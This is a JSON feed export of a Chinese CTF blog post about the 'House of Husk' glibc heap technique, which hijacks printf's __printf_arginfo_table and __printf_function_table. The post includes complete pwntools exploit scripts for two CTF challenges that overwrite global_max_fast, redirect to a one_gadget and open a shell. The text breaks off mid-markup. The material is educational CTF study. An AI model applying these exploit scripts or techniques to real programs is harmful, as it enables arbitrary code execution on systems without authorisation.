{
    "version": "https://jsonfeed.org/version/1",
    "title": "-NIYAH- • All posts by \"格式化字符串\" tag",
    "description": "Niyah",
    "home_page_url": "http://niyah.cn",
    "items": [
        {
            "id": "http://niyah.cn/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/",
            "url": "http://niyah.cn/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/",
            "title": "House-of-husk学习",
            "date_published": "2022-01-25T16:00:00.000Z",
            "content_html": "<p>新姿势</p>\n<a id=\"more\"></a>\n<h1 id=\"house-of-husk学习\"><a class=\"markdownIt-Anchor\" href=\"#house-of-husk学习\">#</a> House-of-husk 学习</h1>\n<h2 id=\"利用原理\"><a class=\"markdownIt-Anchor\" href=\"#利用原理\">#</a> 利用原理</h2>\n<p>参考链接：<a href=\"https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458392560&amp;idx=1&amp;sn=73533c60d701ad5816545520bc889135&amp;chksm=b18f277a86f8ae6ce880fd532b70bbbb70180859299f7476bd1d3033a43ea7e0b3fb6709c460&amp;mpshare=1&amp;scene=23&amp;srcid=0916yGLvaaM3pZ9PY81C5D8W&amp;sharer_sharetime=1631793106745&amp;sharer_shareid=a934676a75a04c6ea85c1e3e4f6123af#rd\">高 Glibc 版本下的堆骚操作解析</a></p>\n<p>利用了 <code>printf</code>  的一个调用链</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">printf<span class=\"token operator\">-></span>vfprintf<span class=\"token operator\">-></span>printf_positional<span class=\"token operator\">-></span>__parse_one_specmb<span class=\"token operator\">-></span><span class=\"token function\">__printf_arginfo_table</span><span class=\"token punctuation\">(</span>spec<span class=\"token punctuation\">)</span> </code></pre>\n<p>_parse_one_specmb 函数会调用 __printf_arginfo_table 和__printf_function_table 两个函数指针中对应 spec 索引的函数指针 printf_arginfo_size_function</p>\n<blockquote>\n<p>这个 spec 索引指针就是格式化字符的 ascii 码值，比如 printf (&quot;% s&quot;)，那么就是 s 的 ascii 码值。</p>\n</blockquote>\n<p>即调用 (__printf_arginfo_table+'spec’8) 和 (printf_function_table+'spec’8) 这两个函数指针。</p>\n<p>实际情况会先调用__printf_arginfo_table 中对应的 spec 索引的函数指针</p>\n<h2 id=\"利用条件\"><a class=\"markdownIt-Anchor\" href=\"#利用条件\">#</a> 利用条件</h2>\n<p>调用的前提便是__printf_arginfo_table 和__printf_function_table 均不为 0，当然大前提是程序要有 printf 和格式化字符串参数</p>\n<blockquote>\n<ul>\n<li>__printf_function_table != 0</li>\n<li>__printf_arginfo_table = heap_addr</li>\n<li>heap_addr+‘spec’*8 = one_gadget</li>\n</ul>\n<p><strong>其中 heap_addr 可以为任何可控地址</strong></p>\n</blockquote>\n<p>如果我们可以将可控的地址写到 __printf_arginfo_table 和 __printf_function_table 便可以进行利用，如 large bin attack 写入堆地址</p>\n<h2 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题</h2>\n<h3 id=\"readme_revenge\"><a class=\"markdownIt-Anchor\" href=\"#readme_revenge\">#</a> readme_revenge</h3>\n<p>首先是对 name 进行输入，其中 name 存在于 bss 段</p>\n<p><img src=\"/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/image-20220126185959019.png\" alt=\"image-20220126185959019\"></p>\n<p>那么我们可以直接从 bss 段溢出覆盖各种我们需要的条件</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./readme_revenge'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    flag_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B4040</span>\n    name_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B73E0</span>\n    argv_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006b7980</span>\n\n    __printf_function_table_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B7A28</span>\n    __printf_arginfo_table_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006B7AA8</span>\n    <span class=\"token comment\"># 由于是静态连接，这两个地址可以自己去 printf 函数中去找</span>\n    \n    stack_chk_fail <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004359b0</span>\n    \n    payload  <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x73</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>stack_chk_fail<span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置要执行的函数</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>argv_addr <span class=\"token operator\">-</span> name_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> name_addr <span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置 argv[0] 即程序名地址为 flag 的地址、</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>__printf_function_table_addr <span class=\"token operator\">-</span> name_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    payload  <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>__printf_arginfo_table_addr <span class=\"token operator\">-</span> name_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n    payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> name_addr <span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置要执行的函数地址 （需要算好偏移）</span>\n\n    <span class=\"token comment\"># 本题输入在bss段，可以将下面的东西全部覆盖到</span>\n    sl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   readme_revenge.py\n@Time    :   2022/01/26 18:11:40\n@Author  :   Niyah \n'''</span></code></pre>\n<h3 id=\"送分题\"><a class=\"markdownIt-Anchor\" href=\"#送分题\">#</a> 送分题</h3>\n<p>本题逻辑很清晰，且可以申请两个特别大的块，并且有个 uaf 可以对 unsorted bin 进行修改，我们泄露出 libc 地址后直接攻击 global_max_fast 让特别大的块也属于 fast bin 随后释放两个大块的时候就会把这两个大块的地址写到 main_arena 附近，如果我们控制好堆块大小，可以直接写到 __printf_arginfo_table 和 __printf_function_table</p>\n<p>此时让__printf_arginfo_table 处指向的这个堆块的合适位置为一个函数指针，便可以在 printf 的时候调用这个函数从而 getshell</p>\n<p><img src=\"/CTF/House-of-husk%E5%AD%A6%E4%B9%A0/1.png\" alt=\"1\"></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./sftpwn'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    __printf_arginfo_table <span class=\"token operator\">=</span> <span class=\"token number\">0x3ec870</span>\n    __printf_function_table <span class=\"token operator\">=</span> <span class=\"token number\">0x3f0658</span>\n    main_arena <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span> \n\n    size1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__printf_arginfo_table <span class=\"token operator\">-</span> main_arena<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span>\n    size2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__printf_function_table <span class=\"token operator\">-</span> main_arena<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span>\n    <span class=\"token comment\"># 算好 size ，让其 free 时刚好在 __printf_arginfo_table 和 __printf_function_table</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'size1'</span><span class=\"token punctuation\">,</span>size1<span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'size2'</span><span class=\"token punctuation\">,</span>size2<span class=\"token punctuation\">)</span>\n\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'big box, what size?'</span> <span class=\"token punctuation\">,</span> size1<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'bigger box, what size?'</span> <span class=\"token punctuation\">,</span> size2<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'rename?(y/n)'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">)</span>\n\n    __malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\n    global_max_fast <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x3ed940</span>\n    ogg <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x10a45c</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'global_max_fast'</span><span class=\"token punctuation\">,</span>global_max_fast<span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'ogg'</span><span class=\"token punctuation\">,</span>ogg<span class=\"token punctuation\">)</span>\n\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'name'</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span>global_max_fast <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> global_max_fast <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'(1:big/2:bigger)'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x73</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\n    <span class=\"token comment\"># q：为什么要 -2 ？</span>\n    <span class=\"token comment\"># a：因为堆块头部包含了 0x10 大小</span>\n    \n    <span class=\"token comment\"># dbg()</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n    \n    <span class=\"token comment\"># p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token 